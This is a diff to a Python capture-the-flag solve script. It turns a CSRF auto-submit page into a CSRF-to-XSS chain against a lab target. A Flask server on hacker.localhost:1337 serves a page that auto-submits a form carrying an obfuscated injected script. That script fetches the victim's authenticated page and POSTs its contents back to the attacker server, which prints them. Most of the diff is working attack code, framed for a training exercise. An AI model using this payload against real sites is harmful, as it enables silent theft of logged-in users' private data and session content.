@@ -3,7 +3,8 @@ import re
 import requests
 import sys
 import time
-from flask import Flask
+import urllib.parse
+from flask import Flask, request
 
 
 """
@@ -15,6 +16,11 @@ in a way the user did not intend to. I.e. we could set up a malicious server and
 respective link via email to the user. Once the user clicks on the link while being authenticated
 to the website we are actually targeting with our attack, we might force the user to send a request
 to the target website by returning a redirect or form request from our malicious server.
+
+Specific to this challenge:
+CSRF can be used in combination with XSS. We force the user to make authenticated requests
+against the target website, that inject a malicious script. We thereby let the user execute the
+XSS attack for us.
 """
 
 def challenge():
@@ -25,22 +31,37 @@ def challenge():
 def attack():
 	app = Flask(__name__)
 
-	@app.route("/")
-	def publish_flag():
-		print(f"Forcing publish!")
+	@app.route("/", methods=["GET"])
+	def xss_via_csrf():
+		print(f"Inject xss!")
 		sys.stdout.flush()
-		return ('<html><body>'
-			'<form name=pub action=http://challenge.localhost:80/publish method="post">'
-			'</form><script>document.forms["pub"].submit()</script>'
+		return '<html><body>' + \
+			'<form name=pub action=http://challenge.localhost:80/ephemeral method="get">' + \
+			'<input id="xss" type="hidden" name="msg"/>' + \
+			'</form>' + \
+			'<script>' + \
+			'let xss = "<script";xss += ">";' + \
+			'xss += "fetch(\'http://challenge.localhost:80/\').then((resp) => resp.text())' + \
+			'.then((text) => {' + \
+			'fetch(\'http://hacker.localhost:1337/\', {\'method\': \'POST\'' + \
+			', \'body\': text});});";' + \
+			'xss += "</script";xss += ">";' + \
+			'document.getElementById("xss").value = xss;' + \
+			'document.forms["pub"].submit();' + \
+			'</script>' + \
 			'</body></html>'
-			)
+
+	@app.route("/", methods=["POST"])
+	def show_flag():
+		print(request.data)
+		sys.stdout.flush()
+		return ""
 
 	app.run("hacker.localhost", 1337, use_reloader=False)
 	exit(1)
 
 pat0 = re.compile(r".*Running on http://challenge.localhost:80\n")
 pat1 = re.compile(r".*Running on http://hacker.localhost:1337\n")
-pat2 = re.compile(r".*Forcing publish!\n")
 challenge_up = False
 attacker_up = False
 r1, w1 = os.pipe()
@@ -92,11 +113,3 @@ while True:
 			os.execv("/challenge/victim", ["/challenge/victim"])
 			print("Error execv.")
 			exit(1)
-
-	m = pat2.match(line)
-	if m:
-		time.sleep(3)
-		url = "http://challenge.localhost:80/login"
-		data = {"username": "hacker", "password": "1337"}
-		resp = requests.post(url, data=data)
-		print(resp.text)
